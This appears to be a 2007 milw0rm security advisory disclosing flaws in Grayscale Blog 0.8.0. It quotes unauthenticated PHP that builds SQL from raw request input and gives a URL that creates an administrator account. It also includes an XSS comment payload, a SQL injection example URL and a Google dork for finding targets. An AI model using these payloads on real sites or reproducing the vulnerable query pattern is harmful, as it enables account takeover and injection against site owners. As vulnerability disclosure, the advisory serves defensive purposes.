@@ -1,0 +1,89 @@
+# Security Advisory - Multiple Vulnerabilities in Grayscale Blog 0.8.0 #
+
+Date            : 2007-02-24
+Product         : Grayscale Blog
+Version         : 0.8.0 - Prior version maybe also be affected
+Vendor          : http://sourceforge.net/projects/gsblogger/ - http://www.karlcore.com/programming/blog/
+
+Vendor Status   : 2007-02-24 -> Not Informed!
+                  2007-03-02 -> Contacted, waiting reply!
+                  2007-03-09 -> Vendor never replyed
+
+Source          : omnipresent - omni
+E-mail          : omnipresent[at]email[dot]it
+
+Google Dork     : "Powered by Grayscale Blog"
+
+
+Security Issues :
+
+1.) Security Query Bypass: [TESTED]
+
+A user can do lots of stuff with some php scripts located in the directory "/scripts/", for example:
+
+add_user.php - Security Bypass
+
+// $user_id=$_REQUEST['user_id']; // not used
+$user_loginname=$_REQUEST['user_loginname'];
+$user_password=$_REQUEST['user_password'];
+$user_real_name=$_REQUEST['user_real_name'];
+$user_email=$_REQUEST['user_email'];
+// $user_date_added=$_REQUEST['user_date_added']; // not used
+// $user_lastmod=$_REQUEST['user_lastmod']; // not used
+$user_permissions=$_REQUEST['user_permissions'];
+$user_added_by=$_REQUEST['user_added_by'];
+$user_lastmod_by=$_REQUEST['user_lastmod_by'];
+$user_allow=$_REQUEST['user_allow'];
+
+// define the query
+$query = "INSERT INTO blog_users (user_loginname, user_password, user_real_name, user_email, user_date_added, user_lastmod, user_permissions, user_added_by, user_lastmod_by, user_allow )
+           values ('$user_loginname', '$user_password', '$user_real_name', '$user_email', NOW(), NOW(), '$user_permissions', '$user_added_by', '$user_lastmod_by', '$user_allow')";
+
+As you can see the code there are no security restriction for any users!! Everyone can add a user with Administrator Privilege ($user_permissions = 3).
+
+Other files affected by some security issues, like the above, are:
+
+-addblog.php
+-editblog.php
+-editlinks.php
+-edit_users.php
+-add_links.php
+
+Example:
+
+http://vulnerable_server/path/scripts/add_users.php?user_loginname=HACK_USER&user_password=HACK_USER&user_real_name=real&user_email=os@so.net&user_permissions=3&user_added_by=1&user_lastmod_by=1&user_allow=1
+
+And you have admin rights!
+
+2.) XSS Vulnerability: [TESTED]
+
+Security issue in the following files:
+
+-"/scripts/addblog_comment.php" -> variables are not properly sanitized before being used in the query string
+-"detail.php" -> variables are not properly sanitized before being used in the query string (query2 -> blog_comments)
+
+Example:
+
+You can put in the comment fields the following script:
+
+<script>alert("XSS")</script>
+
+
+3.) SQL Injection vulnerability: [NOT TESTED]
+
+In lots of files variables are not properly sanitized before being used, these files are, for example:
+
+-userdetail.php -> id variable
+-jump.php       -> id variable and url variable for our redirect
+-detail.php     -> id variable
+
+Example:
+
+http://vulnerable_server/path/detail.php?id=1;[SQL INJECTION]
+
+.:. Patches:
+
+0x0 No vendor patches released!
+0x1 Edit the source code to ensure that input is properly verified.
+
+# milw0rm.com [2007-03-09]
